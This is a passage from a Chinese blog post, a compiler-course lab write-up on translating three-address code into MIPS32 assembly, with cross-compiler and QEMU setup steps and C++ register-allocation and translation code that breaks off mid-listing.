instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun2()</span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun2()</span><br><span class="line">=============[end]=============&gt;&gt;</span><br><span class="line">============[start]============&gt;&gt;</span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun3()</span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun3()</span><br><span class="line">=============[end]=============&gt;&gt;</span><br><span class="line">============[start]============&gt;&gt;</span><br><span class="line">F is used in instruction:</span><br><span class="line">  call <span class="keyword">void</span> @fun4()</span><br><span class="line">=============[end]=============&gt;&gt;</span><br><span class="line">============[start]============&gt;&gt;</span><br><span class="line">=============[end]=============&gt;&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>最近学编译原理，顺便把 LLVM 捡起来</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/23/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/23/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-Lab4/" class="post-title-link" itemprop="url">编译原理-Lab4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-23 19:27:58 / Modified: 19:29:30" itemprop="dateCreated datePublished" datetime="2023-03-23T19:27:58+08:00">2023-03-23</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="第一个任务"><a href="#第一个任务" class="headerlink" title="第一个任务"></a>第一个任务</h2><p>这部分的实验要完成将 TAC 的指令序列转换成目标代码，本文中在这里对实现做了一些限制，假设数据类型只包含整数类型，不包含如浮点数、数组、结构和指针等其它数据类型（也不包括全局变量）</p>
<p>目标语言为汇编语言，这样做的目的就是尽可能简单地实现目标代码的生成并能运行程序观察运行结果，完成了一个可运行的编译程序</p>
<p><strong>MIPS32 架构</strong></p>
<p>MIPS32 的架构是一种基于固定长度的定期编码指令集，并采用导入/存储（load/store）数据模型</p>
<p>目标语言可选定 MIPS32 指令序列，可以在 SPIM Simulator 上运行</p>
<p>MIPS32 体系结构有 : </p>
<ul>
<li>32个通用寄存器</li>
<li>2个特殊寄存器（整数乘除法寄存器）</li>
<li>32个浮点寄存器</li>
<li>PC：程序计数器（在 MIPS32 下，PC 不是一个通用寄存器）</li>
</ul>
<p>本实验只使用 <code>t1-t9 s0-s7</code>，并且不区分功能</p>
<p>TAC 指令和 MIPS32 指令的对应关系如下表所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>中间代码</strong></th>
<th><strong>MIPS32</strong> <strong>指令</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>LABEL x</td>
<td>x:</td>
</tr>
<tr>
<td>x :=#k</td>
<td>li reg(x),k</td>
</tr>
<tr>
<td>x := y</td>
<td>move reg(x), reg(y)</td>
</tr>
<tr>
<td>x := y + z</td>
<td>add reg(x), reg(y) , reg(z)</td>
</tr>
<tr>
<td>x := y - z</td>
<td>sub reg(x), reg(y) , reg(z)</td>
</tr>
<tr>
<td>x := y * z</td>
<td>mul reg(x), reg(y) , reg(z)</td>
</tr>
<tr>
<td>x := y / z</td>
<td>div reg(y) , reg(z)<br>mflo reg(x)</td>
</tr>
<tr>
<td>GOTO x</td>
<td>j x</td>
</tr>
<tr>
<td>RETURN x</td>
<td>move $v0, reg(x)<br>jr $ra</td>
</tr>
<tr>
<td>IF x==y GOTO z</td>
<td>beq reg(x),reg(y),z</td>
</tr>
<tr>
<td>IF x!=y GOTO z</td>
<td>bne reg(x),reg(y),z</td>
</tr>
<tr>
<td>IF x&gt;y GOTO z</td>
<td>bgt reg(x),reg(y),z</td>
</tr>
<tr>
<td>IF x&gt;=y GOTO z</td>
<td>bge reg(x),reg(y),z</td>
</tr>
<tr>
<td>IF x&lt;y GOTO z</td>
<td>ble reg(x),reg(y),z</td>
</tr>
<tr>
<td>IF x&lt;=y GOTO z</td>
<td>blt reg(x),reg(y),z</td>
</tr>
<tr>
<td>X:=CALL f</td>
<td>jal f<br>move reg(x),$v0</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>其中 reg(x) 表示变量 x 所分配的寄存器</li>
<li>寄存器 v0 用来存放子程序的返回值 </li>
</ul>
<p><strong>安装 MIPS 编译器和模拟器</strong></p>
<p>安装编译器和依赖：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install emdebian-archive-keyring</span><br><span class="line">sudo apt-get install linux-libc-dev-mips-cross libc6-mips-cross libc6-dev-mips-cross binutils-mips-linux-gnu gcc-mips-linux-gnu g++-mips-linux-gnu</span><br></pre></td></tr></table></figure>
<p>检测是否安装成功：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -dumpmachine</span><br></pre></td></tr></table></figure>
<p>安装 mips 虚拟机：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-system-mips </span><br></pre></td></tr></table></figure>
<p>下载内核映像和初始化文件：（不推荐）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.debian.org/debian/dists/stable/main/installer-mipsel/current/images/malta/netboot/initrd.gz</span><br><span class="line">wget http://ftp.debian.org/debian/dists/stable/main/installer-mipsel/current/images/malta/netboot/vmlinuz-5.10.0-20-4kc-malta</span><br></pre></td></tr></table></figure>
<p>创建虚拟磁盘：（不推荐）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f qcow2 hda.img 2G</span><br></pre></td></tr></table></figure>
<p>开启虚拟机：（不推荐）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta \</span><br><span class="line">  -m 512 -hda hda.img \</span><br><span class="line">  -kernel vmlinuz-5.10.0-20-4kc-malta \</span><br><span class="line">  -initrd initrd.gz \</span><br><span class="line">  -append &quot;console=ttyS0 nokaslr&quot; \</span><br><span class="line">  -nographic</span><br></pre></td></tr></table></figure>
<ul>
<li>上面这种方法有点 BUG，目前没有启动成功</li>
</ul>
<p>下载内核映像和初始化文件：（推荐）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://people.debian.org/\~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br><span class="line">wget http://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span><br></pre></td></tr></table></figure>
<p>开启虚拟机：（推荐）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>user：user</li>
<li>password：user</li>
</ul>
<p>安装 libguestfs：用于挂载 qcow2 磁盘镜像</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libguestfs-tools</span><br></pre></td></tr></table></figure>
<p>挂载/卸载命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo guestmount -a debian_squeeze_mips_standard.qcow2 -m /dev/sda1 rootfs</span><br><span class="line">sudo cp $1 rootfs/home/user</span><br><span class="line">sudo chmod 777 rootfs/home/user/$1</span><br><span class="line">sudo guestunmount rootfs</span><br></pre></td></tr></table></figure>
<p><strong>寄存器分配算法</strong></p>
<p>在目标生成阶段，一个很重要的工作就是寄存器的分配：</p>
<ul>
<li>最为简单的就是朴素的寄存器分配算法，效率最低，也最容易实现 </li>
<li>对于一个基本块采用的局部寄存器分配算法，实现起来相对不是太难，且效率上有一定提升</li>
</ul>
<p>本实验采用朴素的寄存器分配算法：</p>
<ul>
<li>将所有的变量或临时变量都放入内存中 </li>
<li>每翻译一条中间代码之前都需要吧要用到的变量先加载到寄存器中，得到该代码的计算结果之后又需要将结果写回内存</li>
</ul>
<p>可分配的寄存集合：（不区分功能）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">string</span> regs[] = &#123;<span class="string">&quot;t1&quot;</span>,<span class="string">&quot;t2&quot;</span>,<span class="string">&quot;t3&quot;</span>,<span class="string">&quot;t4&quot;</span>,<span class="string">&quot;t5&quot;</span>,<span class="string">&quot;t6&quot;</span>,<span class="string">&quot;t7&quot;</span>,<span class="string">&quot;t8&quot;</span>,<span class="string">&quot;t9&quot;</span>,<span class="string">&quot;s0&quot;</span>,<span class="string">&quot;s1&quot;</span>,<span class="string">&quot;s2&quot;</span>,<span class="string">&quot;s3&quot;</span>,<span class="string">&quot;s4&quot;</span>,<span class="string">&quot;s5&quot;</span>,<span class="string">&quot;s6&quot;</span>,<span class="string">&quot;s7&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>
<p>核心算法如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;string&gt; variables; <span class="comment">/* 变量数组 */</span></span><br><span class="line">map&lt;string,string&gt; table; <span class="comment">/* 记录已经分配寄存器的变量&#123;key:变量,value:寄存器&#125; */</span></span><br><span class="line">map&lt;string,<span class="keyword">int</span>&gt; reg_ok;</span><br><span class="line"></span><br><span class="line"><span class="function">string <span class="title">Get_R</span><span class="params">(<span class="keyword">const</span> string&amp; temp_str)</span></span>&#123; <span class="comment">/* 引用是原变量的一个别名,跟原来的变量实质上是同一个东西 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = variables.<span class="built_in">begin</span>();it!=variables.<span class="built_in">end</span>();++it)&#123; <span class="comment">/* it为迭代器 */</span></span><br><span class="line">        <span class="keyword">if</span> (*it == temp_str)&#123; <span class="comment">/* 去除重复 */</span></span><br><span class="line">            it = variables.<span class="built_in">erase</span>(it);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (table.<span class="built_in">find</span>(temp_str) != table.<span class="built_in">end</span>())&#123;</span><br><span class="line">        <span class="comment">/* 如果已经存在寄存器分配,那么直接返回寄存器 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;$&quot;</span>+table[temp_str];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">/* 目前传入的变量只有两种类型:temp临时变量,var函数形参 */</span></span><br><span class="line">        vector&lt;string&gt; keys;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;it:table) <span class="comment">/* 遍历table的key(已经分配寄存器) */</span></span><br><span class="line">            <span class="comment">/* 类似于python的&quot;for i in data&quot; */</span></span><br><span class="line">            keys.<span class="built_in">emplace_back</span>(it.first); <span class="comment">/* 直接在vector尾部创建这个元素 */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;key:keys)&#123; <span class="comment">/* 当遇到未分配寄存器的变量时,清空之前所有分配的临时变量的映射关系(临时变量只使用一次) */</span></span><br><span class="line">            <span class="keyword">if</span> (key.<span class="built_in">find</span>(<span class="string">&quot;temp&quot;</span>)!=string::npos &amp;&amp; </span><br><span class="line">                <span class="built_in">find</span>(variables.<span class="built_in">begin</span>(),variables.<span class="built_in">end</span>(),key) == variables.<span class="built_in">end</span>())&#123;</span><br><span class="line">                reg_ok[table[key]] = <span class="number">1</span>;</span><br><span class="line">                table.<span class="built_in">erase</span>(key);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp; reg : regs)&#123; <span class="comment">/* 对于所有寄存器 */</span></span><br><span class="line">            <span class="keyword">if</span>(reg_ok[reg] == <span class="number">1</span>)&#123; <span class="comment">/* 如果寄存器可用 */</span></span><br><span class="line">                table[temp_str] = reg; <span class="comment">/* 将可用寄存器分配给该变量,映射关系存到table中 */</span></span><br><span class="line">                reg_ok[reg] = <span class="number">0</span>; <span class="comment">/* 寄存器reg设置为已用 */</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;$&quot;</span>+reg;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>朴素寄存器分配的翻译</strong> </p>
<p>翻译的操作如下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>中间代码</strong></th>
<th style="text-align:left"><strong>MIPS32</strong> <strong>指令</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>x :=#k</td>
<td style="text-align:left">li $t3 ,k<br>sw $t3, x的偏移量($sp)</td>
</tr>
<tr>
<td>x := y</td>
<td style="text-align:left">lw $t1, y的偏移量($sp)<br>move $t3 , $t1<br>sw $t3, x的偏移量($sp)</td>
</tr>
<tr>
<td>x := y + z</td>
<td style="text-align:left">lw $t1, y的偏移量($sp)<br>lw $t2, z的偏移量($sp)<br>add $t3 , $t1,$t2<br>sw $t3, x的偏移量($sp)</td>
</tr>
<tr>
<td>x := y - z</td>
<td style="text-align:left">l w $t1, y的偏移量($sp)<br>l w $t2, z的偏移量($sp)<br>sub $t3 , $t1,$t2<br>sw $t3, x的偏移量($sp)</td>
</tr>
<tr>
<td>x := y * z</td>
<td style="text-align:left">l w $t1, y的偏移量($sp)<br>l w $t2, z的偏移量($sp)<br>mul $t3 , $t1,$t2<br>sw $t3, x的偏移量($sp)</td>
</tr>
<tr>
<td>x := y / z</td>
<td style="text-align:left">l w $t1, y的偏移量($sp)<br>l w $t2, z的偏移量($sp)<br>mul $t3 , $t1,$t2<br>div $t1,$t2<br>mflo $t3<br>sw $t3, x的偏移量($sp)</td>
</tr>
<tr>
<td>RETURN x</td>
<td style="text-align:left">move $v0, x的偏移量($sp)jr $ra</td>
</tr>
<tr>
<td>IF x==y GOTO z</td>
<td style="text-align:left">l w $t1, x的偏移量($sp)<br>l w $t2, y的偏移量($sp)<br>beq $t1,$t2 ,z</td>
</tr>
<tr>
<td>IF x!=y GOTO z</td>
<td style="text-align:left">l w $t1, x的偏移量($sp)<br>l w $t2, y的偏移量($sp)<br>bne $t1,$t2 ,z</td>
</tr>
<tr>
<td>IF x&gt;y GOTO z</td>
<td style="text-align:left">l w $t1, x的偏移量($sp)<br>l w $t2, y的偏移量($sp)<br>bgt $t1,$t2 ,z</td>
</tr>
<tr>
<td>IF x&gt;=y GOTO z</td>
<td style="text-align:left">l w $t1, x的偏移量($sp)<br>l w $t2, y的偏移量($sp)<br>bge $t1,$t2 ,z</td>
</tr>
<tr>
<td>IF x&lt;y GOTO z</td>
<td style="text-align:left">l w $t1, x的偏移量($sp)<br>l w $t2, y的偏移量($sp)<br>ble $t1,$t2 ,z</td>
</tr>
<tr>
<td>IF x&lt;=y GOTO z</td>
<td style="text-align:left">l w $t1, x的偏移量($sp)<br>l w $t2, y的偏移量($sp)<br>blt $t1,$t2 ,z</td>
</tr>
<tr>
<td>X:=CALL f</td>
</tr>
</tbody>
</table>
</div>
<p>对于函数调用 <code>X:=CALL f</code>，需要完成开辟活动记录的空间、参数的传递和保存返回地址等，函数调用返回后，需要恢复返回地址，读取函数返回值以及释放活动记录空间（活动记录的空间布局没有一个统一的标准，可根据自己的理解保存好数据，并能正确使用即可）</p>
<p>通常，使用4个寄存器完成参数的传递，多余4个的参数使用活动记录空间，这里做了简单处理，所有参数都使用活动记录空间，具体步骤：</p>
<ul>
<li>首先根据保存在函数调用指令中的 offset，找到符号表中的函数定义点，获取函数的参数个数i，这样就可得到在 <code>X:=CALL f</code> 之前的 i 个 ARG 形式的中间代码，获得 i 个实参值所存放的单元，取出后送到形式参数的单元中</li>
<li>根据符号表记录的活动记录大小，开辟活动记录空间和保存返回地址</li>
<li>使用 <code>jal f</code> 转到函数f处</li>
<li>释放活动记录空间和恢复返回地址</li>
<li>使用 <code>sw $v0 , x</code> 的偏移量 <code>($sp)</code> 获取返回值送到 X 的存储单元中</li>
</ul>
<p><strong>TAC 转化为 MIPS32</strong></p>
<p>这就是本实验最复杂的步骤了，首先需要一个函数来读取记录中间变量的文件：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">Load_Inter</span><span class="params">(<span class="keyword">const</span> string&amp; filename)</span></span>&#123;</span><br><span class="line">    string lines;</span><br><span class="line">    string temp_line;</span><br><span class="line">    <span class="function">ifstream <span class="title">in</span><span class="params">(filename)</span></span>;</span><br><span class="line">    <span class="keyword">if</span>(in)&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">getline</span>(in,temp_line))&#123;</span><br><span class="line">            <span class="keyword">if</span> (temp_line == <span class="string">&quot; &quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            lines.<span class="built_in">append</span>(temp_line);</span><br><span class="line">            lines.<span class="built_in">append</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    in.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span> lines;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另一个函数来记录所有变量到 <code>variables</code> 中：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;string&gt; variables; <span class="comment">/* 变量数组 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Load_Var</span><span class="params">(string Inter)</span></span>&#123; <span class="comment">/* 传入参数为中间代码字符串 */</span></span><br><span class="line">    <span class="function">regex <span class="title">temp_re</span><span class="params">(<span class="string">&quot;temp\\d+&quot;</span>)</span></span>; <span class="comment">/* 正则表达式&#123;temp+任意数字&#125; */</span></span><br><span class="line">    <span class="function">regex <span class="title">var_re</span><span class="params">(<span class="string">&quot;var\\d+&quot;</span>)</span></span>;</span><br><span class="line">    smatch result;</span><br><span class="line">    string temp_line;</span><br><span class="line">    </span><br><span class="line">    string::const_iterator iter = Inter.<span class="built_in">begin</span>();</span><br><span class="line">    string::const_iterator iterEnd = Inter.<span class="built_in">end</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">regex_search</span>(iter,iterEnd,result,temp_re))&#123; <span class="comment">/* 匹配regex规则 */</span></span><br><span class="line">        temp_line = result[<span class="number">0</span>];</span><br><span class="line">        variables.<span class="built_in">emplace_back</span>(temp_line); <span class="comment">/* 记录到变量数组中 */</span></span><br><span class="line">        iter = result[<span class="number">0</span>].second; <span class="comment">/* 更新搜索起始位置,搜索剩下的字符串 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    iter = Inter.<span class="built_in">begin</span>();</span><br><span class="line">    iterEnd = Inter.<span class="built_in">end</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">regex_search</span>(iter,iterEnd,result,var_re))&#123;</span><br><span class="line">        temp_line = result[<span class="number">0</span>];</span><br><span class="line">        variables.<span class="built_in">emplace_back</span>(temp_line);</span><br><span class="line">        iter = result[<span class="number">0</span>].second;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>所有临时变量均分配在寄存器中</li>
</ul>
<p>最后需要一个函数来逐行进行翻译，我们把这个函数拆分为多段来分析：</p>
<p>将每行 string 按空格存成数组：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;string&gt; line;</span><br><span class="line">string temp_res;</span><br><span class="line"><span class="function">stringstream <span class="title">input</span><span class="params">(temp_str)</span></span>; </span><br><span class="line"><span class="keyword">while</span> (input&gt;&gt;temp_res) <span class="comment">/* 可以理解为队列,只能从头节点取出值,新数据接在尾节点 */</span></span><br><span class="line">    line.<span class="built_in">emplace_back</span>(temp_res); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(line.<span class="built_in">size</span>()==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>; <span class="comment">/* 规避&#x27;\n&#x27;的影响 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>stringstream</code> 类相当于一个管道（队列），可以用它来分割字符串</li>
</ul>
<p>处理简单指令：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> func_argn;</span><br><span class="line"><span class="keyword">size_t</span> func_param;</span><br><span class="line"></span><br><span class="line">string temp_return;</span><br><span class="line"><span class="keyword">if</span>(line[<span class="number">0</span>] == <span class="string">&quot;LABEL&quot;</span>)&#123; <span class="comment">/* 标记跳转 */</span></span><br><span class="line">    <span class="keyword">return</span> line[<span class="number">1</span>]+<span class="string">&quot;:&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&quot;FUNCTION&quot;</span>)&#123; <span class="comment">/* 标记函数 */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp; reg : regs) <span class="comment">/* 重置reg_ok和table */</span></span><br><span class="line">        reg_ok[reg] = <span class="number">1</span>;</span><br><span class="line">    table.<span class="built_in">clear</span>();</span><br><span class="line">    func_param = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> line[<span class="number">1</span>]+<span class="string">&quot;:&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&quot;RETURN&quot;</span>)&#123; <span class="comment">/* 标记返回 */</span></span><br><span class="line">    func_argn = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\tmove $v0,&quot;</span>+<span class="built_in">Get_R</span>(line[<span class="number">1</span>])+<span class="string">&quot;\n\tjr $ra&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&quot;GOTO&quot;</span>)&#123; <span class="comment">/* 执行跳转 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\tj &quot;</span>+line[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>中间代码转化为 MIPS 的过程以函数为单位，读取到一个新的函数标签时，应该重置 <code>reg_ok</code> 和 <code>table</code></li>
<li>当一个函数调用其子函数时，程序会将寄存器信息保存在栈中，我们不用担心覆盖寄存器带来的影响</li>
</ul>
<p>处理函数参数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string params[] = &#123;<span class="string">&quot;a0&quot;</span>,<span class="string">&quot;a1&quot;</span>,<span class="string">&quot;a2&quot;</span>,<span class="string">&quot;a3&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&quot;ARG&quot;</span>)&#123; <span class="comment">/* 为函数参数分配寄存器 */</span></span><br><span class="line">    func_argn++;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;\tmove $&quot;</span>+params[func_argn<span class="number">-1</span>]+<span class="string">&quot;,&quot;</span>+<span class="built_in">Get_R</span>(line.<span class="built_in">back</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&quot;PARAM&quot;</span>)&#123; <span class="comment">/* 声明函数参数的寄存器 */</span></span><br><span class="line">    func_param++;</span><br><span class="line">    table[line.<span class="built_in">back</span>()] = params[func_param<span class="number">-1</span>]; <span class="comment">/* 永久记录对应的&#123;var,params&#125; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数传参使用 <code>a0-a3</code>（规定函数参数不超过4个）</li>
<li>全局变量 <code>func_argn</code> 和 <code>func_param</code> 用于记录当前参数的标号</li>
</ul>
<p>处理函数调用：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&quot;CALL&quot;</span>)&#123; <span class="comment">/* 函数调用 */</span></span><br><span class="line">    func_argn = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>)+<span class="string">&quot;\taddi $sp,$sp,-60\n\tsw $ra,0($sp)\n\tsw $t0,4($sp)\n\tsw $t1,8($sp)\n\tsw $t2,12($sp)\n\tsw $t3,16($sp)\n&quot;</span>+ \</span><br><span class="line">        <span class="string">&quot;\tsw $t4,20($sp)\n\tsw 